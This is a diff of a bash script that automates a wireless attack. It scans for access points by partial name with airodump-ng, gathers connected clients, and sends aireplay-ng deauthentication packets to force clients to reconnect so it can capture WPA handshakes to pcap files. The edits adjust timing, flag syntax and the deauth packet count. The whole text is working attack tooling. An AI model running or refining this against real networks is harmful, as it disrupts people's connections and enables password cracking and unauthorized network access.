@@ -17,11 +17,12 @@
 fapscan()
 {
 	clear
-	gnome-terminal --geometry=130x20 -x airodump-ng mon0 -w $HOME/tmp --output-format=csv&
+	gnome-terminal --geometry=130x20 -x airodump-ng mon0 -a -w $HOME/tmp -o csv&
 	$COLOR 2;echo "[*] Scanning for AP's with names like $PARTIALESSID [*]";$COLOR 9
 	while [ $DONE -z ] 2> /dev/null
 		do
-			DONE=$( cat $HOME/tmp-01.csv 2> /dev/null | grep $PARTIALESSID ) 
+			sleep 0.3
+			DONE=$(cat $HOME/tmp-01.csv 2> /dev/null | grep $PARTIALESSID) 
 		done
 	sleep 0.5
 	killall airodump-ng
@@ -48,17 +49,18 @@ fclientscan()
 			then
 				CHAN=${CHAN:0:1}
 		fi
-		$COLOR 2;echo " [*] $ESSID Found! BSSID: $BSSID CHANNEL: $CHAN [*]"
+		$COLOR 2;echo " [*] $ESSID Found! BSSID:$BSSID CHANNEL:$CHAN [*]"
 		echo
 		$COLOR 4;echo ' [*] Please wait while I gather active stations.. [*]';$COLOR 9
 		gnome-terminal --geometry=130x20 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
 		DONE=""
 		while [ $DONE -z ] 2> /dev/null
 			do
-				DONE=$( cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10 | grep $BSSID )
+				sleep 2
+				DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10 | grep $BSSID)
 			done
 		killall airodump-ng
-		DONE=$( cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10)
+		DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10)
 		echo "$DONE" > $HOME/tmp
 		while read LINE
 			do
@@ -100,7 +102,7 @@ fcap()
 			CHAN="${CHAN:1}"
 	done
 	sleep 0.5
-	gnome-terminal --geometry=130x20 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w "$HOME"/Desktop/hs/$FILENAME --output-format=pcap&
+	gnome-terminal --geometry=130x20 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w "$HOME"/Desktop/hs/$FILENAME -o pcap&
 	clear
 	echo
 	DONE=""
@@ -109,7 +111,7 @@ fcap()
 			clear
 			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE";$COLOR 9;$COLOR2 9
 			echo
-			$COLOR 1;aireplay-ng -0 1 -a $BSSID -c $CLIE mon0;$COLOR 9
+			$COLOR 1;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR 9
 			sleep 3
 			echo
 			$COLOR 4;read -p " [>] was the hanshake successfully captured? [Y/n]: " WASCAP;$COLOR 9
